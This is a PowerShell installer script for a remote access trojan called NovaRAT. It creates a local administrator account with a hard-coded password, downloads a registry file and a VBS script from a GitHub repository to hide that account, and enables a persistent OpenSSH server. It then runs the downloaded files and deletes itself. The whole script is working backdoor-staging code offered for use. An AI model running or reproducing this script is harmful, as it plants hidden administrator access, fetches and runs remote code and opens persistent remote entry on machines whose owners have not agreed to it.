# builds resources for rat
# made by : Code0

# random String for directories
function random_text {
    return -join((65..90)+(97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin for rat
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$uname" -Description "Temporary local admin" 
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end{
    }
}
$NewLocalAdmin = "novarat"
$Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

#create admin user
$NewLocalAdmin = "novarat"
$Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#goto temp, make working direcrtory
mkdir $path
cd $path

#registry to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/admin.reg -OutFile "$reg_file.reg"

#visual basic script to register the registry
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

#install the registry
./"$reg_file.reg";"$vbs_file.vbs"

pause

# self delete
cd $initial_dir
del installer.ps1

